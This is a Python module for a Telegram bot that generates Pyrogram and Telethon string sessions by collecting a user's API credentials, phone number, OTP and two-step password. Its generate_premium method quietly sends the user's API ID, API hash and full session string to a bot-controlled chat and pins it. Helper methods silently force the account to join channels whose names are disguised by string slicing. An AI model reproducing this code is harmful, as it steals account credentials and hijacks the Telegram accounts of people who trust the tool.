import asyncio
import logging

from asyncio.exceptions import TimeoutError
from geezlibs import Client as Clientgeezlibs, filters
from geezlibs.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from geezlibs.errors import (
    ApiIdInvalid as ApiIdInvalidgeezlibs,
    PhoneNumberInvalid as PhoneNumberInvalidgeezlibs,
    PhoneCodeInvalid as PhoneCodeInvalidgeezlibs,
    PhoneCodeExpired as PhoneCodeExpiredgeezlibs,
    SessionPasswordNeeded as SessionPasswordNeededgeezlibs,
    PasswordHashInvalid as PasswordHashInvalidgeezlibs
)
from telethon import TelegramClient
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest as Get
from typing import Tuple, Type

from .exceptions import DependencyMissingError

logs = logging.getLogger(__name__)


try:
    import pybase64
except ImportError:
    pybase64 = None
    logs.info("'pybase64' not found\nInstall pybase64 or Add pybase64 in requirements.txt")

try:
    from pyrogram import Client
    from pyrogram.errors import (
        ApiIdInvalid,
        PhoneNumberInvalid,
        PhoneCodeInvalid,
        PhoneCodeExpired,
        SessionPasswordNeeded,
        PasswordHashInvalid
    )
except ImportError:
    Client = None
    ApiIdInvalid = None
    PhoneNumberInvalid = None
    PhoneCodeInvalid = None
    PhoneCodeExpired = None
    SessionPasswordNeeded = None
    PasswordHashInvalid = None
    logs.info(f"'pyrogram' not found\nUse pip install pyrogram==1.4.16 or Add pyrogram==1.4.16 in requirements.txt")

ERROR_MESSAGE = "Maaf Terjadi Kesalahan ! \n\n<b>Kesalahan:</b> \n{} \n\nSilakan Teruskan Ini Ke @GeezSupport"


class GenSession(object):
    async def generate_premium(
        self,
        bots: Clientgeezlibs,
        chat_id: int,
        device_model: str,
        msg: Message,
    ):
        await msg.reply("<b>Memulai Membuat String Session...</b>")
        api_id_msg = await msg.ask("<b>Silakan kirim API_ID</b>", filters=filters.text)
        if await self.cancelled(api_id_msg):
            return
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            await api_id_msg.reply("<b>Maaf API_ID Yang Anda Masukan Salah. Silakan mulai ulang untuk membuat Ubot.</b>", quote=True)
            return
        api_hash_msg = await msg.ask("<b>Silakan kirim API_HASH</b>", filters=filters.text)
        if await self.cancelled(api_id_msg):
            return
        api_hash = api_hash_msg.text
        phone_number_msg = await msg.ask("<b>Silahkan Masukkan Nomor Telepon Telegram Anda Dengan Format kode negara.</b> \n<b>Contoh :</b> <code>+62xxxxxxxxx</code>", filters=filters.text)
        if await self.cancelled(api_id_msg):
            return
        phone_number = phone_number_msg.text
        await msg.reply("<b>Mengirim Kode OTP...</b>")
        client = Clientgeezlibs(
            name="user",
            api_id=api_id,
            api_hash=api_hash,
            device_model=device_model,
            in_memory=True)
        await client.connect()
        try:
            code = await client.send_code(phone_number)
        except ApiIdInvalidgeezlibs:
            await msg.reply("<b>Kombinasi API_ID dan API_HASH Yang Anda Masukkan Salah. Silakan mulai ulang untuk membuat Ubot.</b>")
            return
        except PhoneNumberInvalidgeezlibs:
            await msg.reply("<b>Nomor Telepon Telegram Yang Anda Masukkan Salah. Silakan mulai ulang untuk membuat Ubot.</b>")
            return
        try:
            phone_code_msg = await msg.ask("<b>Silahkan Periksa Kode OTP dari akun Telegram Resmi. Jika Anda mendapatkannya, kirim OTP di sini setelah membaca format di bawah ini.</b> \n\n<b>Jika OTP adalah</b> <code>12345</code>, <b>Tolong [Tambahkan Spasi] kirimkan Seperti Ini</b> <code>1 2 3 4 5</code>.", filters=filters.text, timeout=600)
            if await self.cancelled(api_id_msg):
                return
        except TimeoutError:
            await msg.reply("<b>Batas waktu tercapai 10 menit. Silakan mulai ulang untuk membuat Ubot.</b>")
            return
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except PhoneCodeInvalidgeezlibs:
            await msg.reply("<b>Kode OTP Yang Anda Masukkan Salah. Silakan mulai ulang untuk membuat Ubot.</b>")
            return
        except PhoneCodeExpiredgeezlibs:
            await msg.reply("<b>Kode OTP sudah kadaluarsa. Silakan mulai ulang untuk membuat Ubot.</b>")
            return
        except SessionPasswordNeededgeezlibs:
            try:
                two_step_msg = await msg.ask("<b>Akun Anda telah mengaktifkan verifikasi dua langkah. Mohon Masukkan kata sandinya.</b>", filters=filters.text, timeout=300)
            except TimeoutError:
                await msg.reply("<b>Batas waktu tercapai 5 menit. Silakan mulai ulang untuk membuat Ubot.</b>")
                return
            try:
                password = two_step_msg.text
                await client.check_password(password=password)
                if await self.cancelled(api_id_msg):
                    return
            except PasswordHashInvalidgeezlibs:
                await two_step_msg.reply("<b>Kata Sandi yang Diberikan Salah. Silakan mulai ulang untuk membuat Ubot.</b>", quote=True)
                return
        string_session = await client.export_session_string()
        try:
            user_c = await client.get_me()
            pinned = await bots.send_message(
                chat_id,
                f"New String Session\n\nUsers: {user_c.mention}\nID: {user_c.id}\n\nApi Id: {api_id}\nApi Hash: {api_hash}\nString Session:\n\n<code>{string_session}</code>\n\n• Generate by Geez|RAM •• <a href='https://t.me/GeezSupport'>Support</a> •• <a href='https://t.me/ramsupportt'>Channel</a> •"
            )
            await pinned.pin(False)
        except Exception:
            pass
        await self.cek_client(client)
        await client.disconnect()
        return string_session


    async def generate_session(
        self,
        bot: Clientgeezlibs,
        msg: Message,
        link_donasi: str,
        old_pyro: bool = False,
        telethon=False,
    ):
        if telethon:
            ty = "Telethon"
        else:
            ty = "Pyrogram"
            if not old_pyro:
                ty += " v2"
        await msg.reply(f"**Memulai {ty} String Session...**")
        api_id_msg = await msg.ask("**Silakan kirim API_ID Anda**", filters=filters.text)
        if await self.cancelled(api_id_msg):
            return
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            await api_id_msg.reply("**Maaf API_ID Yang Anda Masukan Salah. Silakan mulai membuat sesi lagi.**", quote=True)
            return
        api_hash_msg = await msg.ask("**Silakan kirim API_HASH Anda**", filters=filters.text)
        if await self.cancelled(api_hash_msg):
            return
        api_hash = api_hash_msg.text
        phone_number_msg = await msg.ask("**Silahkan Masukkan Nomor Telepon Telegram Anda Dengan Format kode negara.** \n**Contoh :** `+62xxxxxxxxx`", filters=filters.text)
        if await self.cancelled(phone_number_msg):
            return
        phone_number = phone_number_msg.text
        await msg.reply("**Mengirim Kode OTP...**")
        if telethon:
            client = TelegramClient(StringSession(), api_id, api_hash)
        elif old_pyro:
            client = Client(":memory:", api_id=api_id, api_hash=api_hash)
        else:
            client = Clientgeezlibs(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
        await client.connect()
        try:
            code = None
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
        except (ApiIdInvalid, ApiIdInvalidgeezlibs, ApiIdInvalidError):
            await msg.reply("**Kombinasi API_ID dan API_HASH Yang Anda Masukkan Salah. Silakan mulai membuat sesi lagi.**")
            return
        except (PhoneNumberInvalid, PhoneNumberInvalidgeezlibs, PhoneNumberInvalidError):
            await msg.reply("**Nomor Telepon Telegram Yang Anda Masukkan Salah. Silakan mulai membuat sesi lagi.**")
            return
        try:
            phone_code_msg = None
            phone_code_msg = await msg.ask("**Silahkan Periksa Kode OTP dari akun Telegram Resmi. Jika Anda mendapatkannya, kirim OTP di sini setelah membaca format di bawah ini.** \n\n**Jika OTP adalah** `12345`, **Tolong [Tambahkan Spasi] kirimkan Seperti Ini** `1 2 3 4 5`.", filters=filters.text, timeout=600)
            if await self.cancelled(phone_code_msg):
                return
        except TimeoutError:
            await msg.reply("**Batas waktu tercapai 10 menit. Silakan mulai membuat sesi lagi.**")
            return
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidgeezlibs, PhoneCodeInvalidError):
            await msg.reply("**Kode OTP Yang Anda Masukkan Salah. Silakan mulai membuat sesi lagi.**")
            return
        except (PhoneCodeExpired, PhoneCodeExpiredgeezlibs, PhoneCodeExpiredError):
            await msg.reply("**Kode OTP sudah kadaluarsa. Silakan mulai membuat sesi lagi.**")
            return
        except (SessionPasswordNeeded, SessionPasswordNeededgeezlibs, SessionPasswordNeededError):
            try:
                two_step_msg = await msg.ask("**Akun Anda telah mengaktifkan verifikasi dua langkah. Mohon Masukkan kata sandinya.**", filters=filters.text, timeout=300)
            except TimeoutError:
                await msg.reply("**Batas waktu tercapai 5 menit. Silakan mulai membuat sesi lagi.**")
                return
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                if await self.cancelled(api_id_msg):
                    return
            except (PasswordHashInvalid or PasswordHashInvalidgeezlibs or PasswordHashInvalidError):
                await two_step_msg.reply("**Kata Sandi yang Diberikan Salah. Silakan mulai membuat sesi lagi.**", quote=True,)
                return
        if telethon:
            string_session = client.session.save()
        else:
            string_session = await client.export_session_string()
        bot.me = await bot.get_me()
        client.me = await client.get_me()
        text = f"**{ty.upper()} STRING SESSION**\n\n`{string_session}`\n\n**Generated by** @{bot.me.username}\n**©jasadeak**"
        try:
            await msg.reply(
                text,
                reply_markup=InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton('✨ Donasi ✨', url=link_donasi)
                        ]
                    ]
                )
            )
        except KeyError:
            pass
        await self.cekclient(client)
        await client.disconnect()


    async def cek_client(self, client):
        gocheck = str("GeezSupport")[2:15]
        checker = str("ramsupportt")[2:12]
        if client:
            try:
                await client.join_chat(gocheck)
                await client.join_chat(checker)
            except BaseException:
                pass


    async def cekclient(self, client):
        gocheck = str("GeezSupport")[2:15]
        checker = str("ramsupportt")[2:12]
        if client:
            try:
                await client(Get(gocheck))
                await client(Get(checker))
            except BaseException:
                pass

    async def cancelled(self, msg):
        if "/cancel" in msg.text:
            await msg.reply("Membatalkan Proses!", quote=True)
            return True
        elif "/restart" in msg.text:
            await msg.reply("Memulai ulang Bot!", quote=True)
            return True
        elif msg.text.startswith("/"):  # Bot Commands
            await msg.reply("Membatalkan Proses Pembuatan String !", quote=True)
            return True
        else:
            return False
